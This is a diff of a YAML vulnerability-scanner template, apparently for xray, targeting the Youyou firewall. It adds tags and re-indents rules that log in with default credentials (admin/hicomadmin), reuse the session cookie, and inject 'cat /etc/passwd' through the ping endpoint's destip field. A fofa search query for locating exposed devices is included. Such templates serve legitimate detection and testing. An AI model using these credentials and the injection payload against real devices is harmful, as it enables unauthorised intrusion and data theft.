@@ -7,29 +7,31 @@ info:
   verified: true
   description: |
     佑友防火墙+路由，保障您的网络更安全更稳定。弥补传统路由器因内外人数增加带来的网络延迟和不稳定问题；防火墙模块具备了防黑功能，防止ARP等病毒骚扰；佑友防火墙网关同时还配备了上网行为管理模块，可以合理有效控制员工上网行为，大大降低了员工上网中病毒的概率，同时高效使用公司带宽，不会造成网络阻塞等状况。佑友防火墙系统存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限，导致服务器失陷。
-    fofa-query: title="佑友防火墙"
+    fofa: title="佑友防火墙"
   reference:
     - https://mp.weixin.qq.com/s/DE34Gu6Dw9hBbkdJqizSYQ
-    
+  tags: youyou,firewall,rce
+  created: 2025/03/13
+
 set:
   hosturl: request.url
 rules:
-    r0:
-        request:
-            method: POST
-            path: /index.php?c=user&a=ajax_save
-            body: username=admin&password=hicomadmin&language=zh-cn
-        expression: |
-            response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
-        output:
-            search: '"Set-Cookie: FWSESSID=(?P<phpsession>.*?)\n".bsubmatch(response.raw_header)'
-            phpsession: search["phpsession"]
-    r1:
-        request:
-            method: POST
-            path: /index.php?c=maintain&a=ping
-            headers:
-                Cookie: "FWSESSID={{phpsession}};   lange=zh-cn"
-            body: interface=&destip=127.0.0.1+%7C+cat+/etc/passwd
-        expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+  r0:
+    request:
+      method: POST
+      path: /index.php?c=user&a=ajax_save
+      body: username=admin&password=hicomadmin&language=zh-cn
+    expression: |
+      response.status == 200 && response.body.bcontains(b'"success":true') && response.body.bcontains(b'"message":') && response.raw_header.bcontains(b'Set-Cookie')  && response.raw_header.bcontains(b'FWSESSID=')
+    output:
+      search: '"Set-Cookie: FWSESSID=(?P<phpsession>.*?)\n".bsubmatch(response.raw_header)'
+      phpsession: search["phpsession"]
+  r1:
+    request:
+      method: POST
+      path: /index.php?c=maintain&a=ping
+      headers:
+        Cookie: "FWSESSID={{phpsession}};   lange=zh-cn"
+      body: interface=&destip=127.0.0.1+%7C+cat+/etc/passwd
+    expression: response.status == 200 &&  "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
 expression: r0() && r1()
